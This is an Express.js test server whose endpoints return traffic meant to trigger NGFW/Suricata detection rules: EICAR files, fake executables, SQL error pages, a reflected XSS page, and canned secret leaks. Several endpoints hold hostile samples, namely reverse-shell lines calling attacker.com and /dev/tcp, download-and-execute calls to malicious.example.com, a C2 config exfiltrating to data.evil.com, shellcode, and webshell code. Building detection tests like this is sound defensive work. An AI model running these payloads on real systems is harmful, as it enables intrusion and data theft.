'use strict';

const express = require('express');
const router = express.Router();

// ============================================
// EICAR TEST STRING (68 bytes)
// ============================================
const EICAR_STRING = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';

// ============================================
// TEST CASES CONFIG - 20 Important Rules
// SID Range: 5900006 - 6400033
// ============================================
const TEST_CASES = [
    // === MALWARE & VIRUS DETECTION ===
    {
        id: 1,
        sid: '5900006',
        name: 'EICAR Test File Detection',
        category: 'Malware',
        description: 'Standard antivirus test file - EICAR pattern detection via HTTP download',
        endpoint: '/eicar.com',
        method: 'GET',
        expectedAction: 'BLOCK',
        severity: 'HIGH'
    },
    {
        id: 2,
        sid: '5900007',
        name: 'EICAR in ZIP Archive',
        category: 'Malware',
        description: 'EICAR test file embedded in ZIP archive - tests archive inspection',
        endpoint: '/eicar.zip',
        method: 'GET',
        expectedAction: 'BLOCK',
        severity: 'HIGH'
    },
    {
        id: 3,
        sid: '5900008',
        name: 'EICAR Base64 Encoded',
        category: 'Malware',
        description: 'EICAR test file with Base64 encoding - tests decoding capability',
        endpoint: '/eicar-b64',
        method: 'GET',
        expectedAction: 'BLOCK',
        severity: 'HIGH'
    },

    // === EXECUTABLE & SUSPICIOUS FILE DOWNLOADS ===
    {
        id: 4,
        sid: '6100001',
        name: 'EXE File Download via HTTP',
        category: 'Suspicious File',
        description: 'Windows executable download over unencrypted HTTP - potential malware delivery',
        endpoint: '/download/test.exe',
        method: 'GET',
        expectedAction: 'ALERT/BLOCK',
        severity: 'MEDIUM'
    },
    {
        id: 5,
        sid: '6100002',
        name: 'DLL File Download',
        category: 'Suspicious File',
        description: 'Dynamic Link Library download - often used in DLL hijacking attacks',
        endpoint: '/download/test.dll',
        method: 'GET',
        expectedAction: 'ALERT/BLOCK',
        severity: 'MEDIUM'
    },
    {
        id: 6,
        sid: '6100003',
        name: 'SCR (Screensaver) Download',
        category: 'Suspicious File',
        description: 'Screensaver file download - commonly used to disguise malware',
        endpoint: '/download/test.scr',
        method: 'GET',
        expectedAction: 'ALERT/BLOCK',
        severity: 'HIGH'
    },
    {
        id: 7,
        sid: '6100004',
        name: 'BAT/CMD Script Download',
        category: 'Suspicious File',
        description: 'Batch script download - can execute arbitrary commands',
        endpoint: '/download/test.bat',
        method: 'GET',
        expectedAction: 'ALERT/BLOCK',
        severity: 'HIGH'
    },
    {
        id: 8,
        sid: '6100005',
        name: 'PowerShell Script Download',
        category: 'Suspicious File',
        description: 'PS1 script download - commonly used in fileless malware attacks',
        endpoint: '/download/test.ps1',
        method: 'GET',
        expectedAction: 'ALERT/BLOCK',
        severity: 'HIGH'
    },

    // === WEB APPLICATION ATTACKS ===
    {
        id: 9,
        sid: '6200001',
        name: 'SQL Injection Pattern in Response',
        category: 'Web Attack',
        description: 'Server response containing SQL error messages - indicates SQLi vulnerability',
        endpoint: '/vuln/sqli-error',
        method: 'GET',
        expectedAction: 'ALERT',
        severity: 'HIGH'
    },
    {
        id: 10,
        sid: '6200002',
        name: 'XSS Pattern in Response',
        category: 'Web Attack',
        description: 'Cross-Site Scripting pattern in HTTP response',
        endpoint: '/vuln/xss-reflect',
        method: 'GET',
        expectedAction: 'ALERT',
        severity: 'MEDIUM'
    },
    {
        id: 11,
        sid: '6200003',
        name: 'Directory Traversal Pattern',
        category: 'Web Attack',
        description: 'Path traversal sequences in response - potential LFI vulnerability',
        endpoint: '/vuln/path-traversal',
        method: 'GET',
        expectedAction: 'ALERT',
        severity: 'HIGH'
    },
    {
        id: 12,
        sid: '6200004',
        name: 'Command Injection Pattern',
        category: 'Web Attack',
        description: 'Shell command output in response - indicates RCE vulnerability',
        endpoint: '/vuln/cmd-injection',
        method: 'GET',
        expectedAction: 'ALERT',
        severity: 'CRITICAL'
    },

    // === SENSITIVE DATA EXPOSURE ===
    {
        id: 13,
        sid: '6300001',
        name: 'Credit Card Number in Response',
        category: 'Data Leak',
        description: 'Credit card pattern detected in HTTP response - PCI-DSS violation',
        endpoint: '/leak/credit-card',
        method: 'GET',
        expectedAction: 'ALERT',
        severity: 'CRITICAL'
    },
    {
        id: 14,
        sid: '6300002',
        name: 'SSN Pattern in Response',
        category: 'Data Leak',
        description: 'Social Security Number pattern in response - PII exposure',
        endpoint: '/leak/ssn',
        method: 'GET',
        expectedAction: 'ALERT',
        severity: 'CRITICAL'
    },
    {
        id: 15,
        sid: '6300003',
        name: 'Private Key Exposure',
        category: 'Data Leak',
        description: 'RSA/SSH private key in HTTP response - critical security breach',
        endpoint: '/leak/private-key',
        method: 'GET',
        expectedAction: 'ALERT/BLOCK',
        severity: 'CRITICAL'
    },
    {
        id: 16,
        sid: '6300004',
        name: 'Password Hash Exposure',
        category: 'Data Leak',
        description: 'Password hashes (MD5/SHA) in response - credential theft risk',
        endpoint: '/leak/password-hash',
        method: 'GET',
        expectedAction: 'ALERT',
        severity: 'HIGH'
    },

    // === C2 & SUSPICIOUS PATTERNS ===
    {
        id: 17,
        sid: '6400001',
        name: 'Suspicious User-Agent Response',
        category: 'C2/Malware',
        description: 'Response to known malicious user-agent patterns',
        endpoint: '/c2/user-agent',
        method: 'GET',
        expectedAction: 'ALERT',
        severity: 'HIGH'
    },
    {
        id: 18,
        sid: '6400002',
        name: 'Base64 Encoded Payload',
        category: 'C2/Malware',
        description: 'Large Base64 encoded data in response - possible C2 communication',
        endpoint: '/c2/b64-payload',
        method: 'GET',
        expectedAction: 'ALERT',
        severity: 'MEDIUM'
    },
    {
        id: 19,
        sid: '6400003',
        name: 'Hex Encoded Shellcode Pattern',
        category: 'C2/Malware',
        description: 'Hexadecimal shellcode pattern in HTTP response',
        endpoint: '/c2/shellcode',
        method: 'GET',
        expectedAction: 'BLOCK',
        severity: 'CRITICAL'
    },
    {
        id: 20,
        sid: '6400033',
        name: 'Webshell Detection Pattern',
        category: 'C2/Malware',
        description: 'PHP/ASP webshell patterns in response - server compromise indicator',
        endpoint: '/c2/webshell',
        method: 'GET',
        expectedAction: 'BLOCK',
        severity: 'CRITICAL'
    }
];

// ============================================
// API: Get all test cases info
// ============================================
router.get('/api/test-cases', (req, res) => {
    res.json({
        total: TEST_CASES.length,
        sidRange: '5900006 - 6400033',
        testCases: TEST_CASES
    });
});

// ============================================
// EICAR TEST ENDPOINTS (1-3)
// ============================================
router.get('/eicar.com', (req, res) => {
    res.set({
        'Content-Type': 'application/octet-stream',
        'Content-Disposition': 'attachment; filename="eicar.com"',
        'X-Test-SID': '5900006'
    });
    res.send(EICAR_STRING);
});

router.get('/eicar.zip', (req, res) => {
    // Simple ZIP with EICAR (PK header + EICAR)
    const zipHeader = Buffer.from([0x50, 0x4B, 0x03, 0x04, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00]);
    const eicarBuffer = Buffer.from(EICAR_STRING);
    const combined = Buffer.concat([zipHeader, eicarBuffer]);
    
    res.set({
        'Content-Type': 'application/zip',
        'Content-Disposition': 'attachment; filename="eicar.zip"',
        'X-Test-SID': '5900007'
    });
    res.send(combined);
});

router.get('/eicar-b64', (req, res) => {
    const b64Eicar = Buffer.from(EICAR_STRING).toString('base64');
    res.set({
        'Content-Type': 'text/plain',
        'X-Test-SID': '5900008'
    });
    res.send(b64Eicar);
});

// ============================================
// SUSPICIOUS FILE DOWNLOADS (4-8)
// ============================================
const createFakeExe = () => {
    // MZ header (DOS executable signature) + padding
    const mzHeader = Buffer.from([0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
    const padding = Buffer.alloc(100, 0x90); // NOP sled
    return Buffer.concat([mzHeader, padding, Buffer.from('This is a test executable for NGFW testing')]);
};

router.get('/download/test.exe', (req, res) => {
    res.set({
        'Content-Type': 'application/x-msdownload',
        'Content-Disposition': 'attachment; filename="test.exe"',
        'X-Test-SID': '6100001'
    });
    res.send(createFakeExe());
});

router.get('/download/test.dll', (req, res) => {
    res.set({
        'Content-Type': 'application/x-msdownload',
        'Content-Disposition': 'attachment; filename="test.dll"',
        'X-Test-SID': '6100002'
    });
    res.send(createFakeExe());
});

router.get('/download/test.scr', (req, res) => {
    res.set({
        'Content-Type': 'application/x-msdownload',
        'Content-Disposition': 'attachment; filename="test.scr"',
        'X-Test-SID': '6100003'
    });
    res.send(createFakeExe());
});

router.get('/download/test.bat', (req, res) => {
    const batContent = `@echo off
REM Test batch file for NGFW testing
echo NGFW_TEST_BATCH_SCRIPT
net user
ipconfig /all
whoami
`;
    res.set({
        'Content-Type': 'application/x-bat',
        'Content-Disposition': 'attachment; filename="test.bat"',
        'X-Test-SID': '6100004'
    });
    res.send(batContent);
});

router.get('/download/test.ps1', (req, res) => {
    const ps1Content = `# PowerShell test script for NGFW testing
$ExecutionContext.SessionState.LanguageMode
Get-Process
Invoke-WebRequest -Uri "http://malicious.example.com/payload"
Invoke-Expression "whoami"
[System.Net.WebClient]::new().DownloadString("http://c2.example.com")
`;
    res.set({
        'Content-Type': 'application/x-powershell',
        'Content-Disposition': 'attachment; filename="test.ps1"',
        'X-Test-SID': '6100005'
    });
    res.send(ps1Content);
});

// ============================================
// WEB ATTACK PATTERNS (9-12)
// ============================================
router.get('/vuln/sqli-error', (req, res) => {
    res.set('X-Test-SID', '6200001');
    res.send(`
        <html><body>
        <h1>Database Error</h1>
        <p>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version</p>
        <pre>mysql_query(): SELECT * FROM users WHERE id = '1' OR '1'='1'</pre>
        <p>Warning: mysql_fetch_array() expects parameter 1 to be resource</p>
        <p>SQLSTATE[42000]: Syntax error or access violation</p>
        </body></html>
    `);
});

router.get('/vuln/xss-reflect', (req, res) => {
    const payload = req.query.q || '<script>alert("XSS")</script>';
    res.set('X-Test-SID', '6200002');
    res.send(`
        <html><body>
        <h1>Search Results</h1>
        <p>You searched for: ${payload}</p>
        <script>document.write('<img src=x onerror=alert(document.cookie)>')</script>
        <img src="javascript:alert('XSS')">
        <body onload="alert('XSS')">
        </body></html>
    `);
});

router.get('/vuln/path-traversal', (req, res) => {
    res.set('X-Test-SID', '6200003');
    res.send(`
        File content from: ../../../etc/passwd
        
        root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        bin:x:2:2:bin:/bin:/usr/sbin/nologin
        sys:x:3:3:sys:/dev:/usr/sbin/nologin
        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
        
        File: ....//....//....//windows/system32/config/sam
        File: ..\\..\\..\\windows\\system.ini
    `);
});

router.get('/vuln/cmd-injection', (req, res) => {
    res.set('X-Test-SID', '6200004');
    res.send(`
        Command output:
        $ whoami
        root
        
        $ cat /etc/shadow
        root:$6$xyz:18000:0:99999:7:::
        
        $ nc -e /bin/sh attacker.com 4444
        $ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
        $ python -c 'import socket,subprocess,os;s=socket.socket()'
    `);
});

// ============================================
// DATA LEAK PATTERNS (13-16)
// ============================================
router.get('/leak/credit-card', (req, res) => {
    res.set('X-Test-SID', '6300001');
    res.json({
        message: 'Customer payment info (TEST DATA)',
        cards: [
            { number: '4111-1111-1111-1111', cvv: '123', expiry: '12/25' },
            { number: '5500 0000 0000 0004', cvv: '456', expiry: '06/26' },
            { number: '3400 000000 00009', cvv: '7890', expiry: '03/27' }
        ]
    });
});

router.get('/leak/ssn', (req, res) => {
    res.set('X-Test-SID', '6300002');
    res.json({
        message: 'Employee records (TEST DATA)',
        employees: [
            { name: 'John Doe', ssn: '123-45-6789' },
            { name: 'Jane Smith', ssn: '987-65-4321' },
            { name: 'Bob Wilson', ssn: '456-78-9012' }
        ]
    });
});

router.get('/leak/private-key', (req, res) => {
    res.set('X-Test-SID', '6300003');
    res.type('text/plain').send(`
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy0AHB7MZs0NR1BQmWAALVN
NGxPM0NRq3o2C1WKwVzXG5qR7VLwKPyF5m5qR7VLwKPyF5m5qR7VLwKPyF5m5qR7
THISISAFAKEPRIVATEKEYFORTESTINGPURPOSESONLY1234567890ABCDEF
NGFWTESTPRIVATEKEYEXPOSUREDETECTION0987654321ZYXWVUTSRQPONM
-----END RSA PRIVATE KEY-----

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn
TESTKEYTESTKEYTESTKEYTESTKEYTESTKEYTESTKEYTESTKEY
-----END OPENSSH PRIVATE KEY-----
    `);
});

router.get('/leak/password-hash', (req, res) => {
    res.set('X-Test-SID', '6300004');
    res.json({
        message: 'Exposed password hashes (TEST DATA)',
        hashes: [
            { user: 'admin', hash: '5f4dcc3b5aa765d61d8327deb882cf99', type: 'MD5' },
            { user: 'root', hash: '$2a$10$N9qo8uLOickgx2ZMRZoMy.MqrqvKwFVcKjxL0NZCj/YPdGTq1i3oC', type: 'bcrypt' },
            { user: 'user1', hash: '$6$rounds=5000$saltsalt$hash', type: 'SHA-512' },
            { user: 'backup', hash: 'e10adc3949ba59abbe56e057f20f883e', type: 'MD5' }
        ]
    });
});

// ============================================
// C2 & SUSPICIOUS PATTERNS (17-20)
// ============================================
router.get('/c2/user-agent', (req, res) => {
    res.set({
        'X-Test-SID': '6400001',
        'X-Bot-Response': 'true'
    });
    res.send(`
        Bot command received.
        User-Agent patterns for malware:
        - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Trojan.Win32)
        - Wget/1.0 (linux)
        - curl/7.0 (malware-downloader)
        - Python-urllib/2.7 (botnet)
        
        Command: EXECUTE_PAYLOAD
        Status: READY
    `);
});

router.get('/c2/b64-payload', (req, res) => {
    // Suspicious base64 payload (simulated C2 command)
    const payload = Buffer.from(`
        cmd: download_and_execute
        url: http://malicious.example.com/stage2.exe
        persist: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
        exfil: ftp://data.evil.com/stolen/
        beacon: 300
    `).toString('base64');
    
    res.set('X-Test-SID', '6400002');
    res.json({
        status: 'ok',
        data: payload,
        encoded: true
    });
});

router.get('/c2/shellcode', (req, res) => {
    // Simulated shellcode pattern (NOP sled + fake shellcode bytes)
    const shellcode = '\\x90\\x90\\x90\\x90\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80';
    const hexPayload = '4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000e00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d';
    
    res.set('X-Test-SID', '6400003');
    res.type('text/plain').send(`
        Shellcode payload detected:
        ${shellcode}
        
        Hex encoded executable:
        ${hexPayload}
        
        Meterpreter staging...
        Reverse shell connecting to 10.0.0.1:4444
    `);
});

router.get('/c2/webshell', (req, res) => {
    res.set('X-Test-SID', '6400033');
    res.type('text/html').send(`
        <?php
        // c99 webshell simulation
        @eval($_POST['cmd']);
        system($_GET['c']);
        passthru($cmd);
        shell_exec($_REQUEST['exec']);
        ?>
        
        <%@ Page Language="C#" %>
        <% Response.Write(Server.Execute(Request["cmd"])); %>
        
        <jsp:scriptlet>
        Runtime.getRuntime().exec(request.getParameter("cmd"));
        </jsp:scriptlet>
        
        WSO Shell v2.0 - File Manager
        r57shell - Server info
        b374k shell - Command execution ready
    `);
});

// ============================================
// EICAR inline & API (legacy endpoints)
// ============================================
router.get('/eicar-inline', (req, res) => {
    res.set('Content-Type', 'text/plain');
    res.send(EICAR_STRING);
});

router.get('/api/eicar', (req, res) => {
    res.json({
        name: 'EICAR-STANDARD-ANTIVIRUS-TEST-FILE',
        size: EICAR_STRING.length,
        string: EICAR_STRING,
        md5: '44d88612fea8a8f36de82e1278abb02f',
        sha256: '275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f',
        suricata_sids: ['5900003', '5900004', '5900005', '5900006', '5900007', '5900008']
    });
});

module.exports = router;
